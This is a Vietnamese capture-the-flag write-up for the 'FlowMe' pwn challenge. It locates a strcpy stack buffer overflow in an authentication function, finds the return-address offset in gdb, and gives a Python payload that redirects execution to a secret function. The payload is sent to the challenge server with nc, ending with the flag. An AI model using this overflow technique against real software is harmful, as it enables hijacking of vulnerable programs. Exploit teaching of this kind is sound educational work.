# PWN - FlowMe

-   Đoán bài này thuộc dạng **buffer overflow**.

-   Để ý hàm `authentication`, chắc là buffer overflow xảy ra ở đây.

    ```
    char password_buffer[256];
    strcpy(password_buffer, password);
    ```

-   Dùng gdb debug, đặt break point ở cuối hàm authentication (ngay dòng return).

-   Chạy thử chương trình với một input thiệt là dài, như này:

    ```
    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
    ```

-   Khi chương trình chạy hết hàm `authentication`, word đầu tiên của stack (thanh ghi rsp) có giá trị như sau:

    ```
    0x4f4f4f4f
    ```

-   Đây là 4 chữ O, tức là đoạn **OOOO** trong input viết đè lên vùng nhớ chứa địa chỉ trả về. Ta cần đổi **OOOO** thành địa chỉ vùng nhớ của hàm `secret_funtion` (0x4007ea). Chương trình python để làm điều đó:

    ```python
    import struct

    padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
    eip = struct.pack("I", 0x4007ea)
    payload = "\xCC"*4
    print(padding+eip+payload)
    ```

-   Ghi kết quả ra file và hường thụ thành quả:

    ```
    python flowme.py > flowme.txt
    nc 159.65.13.76 33103 < flowme.txt
    ```

Flag: `HCMUS-CTF{You_have_to_learn_basic_stack_based_buffer_overflow}`
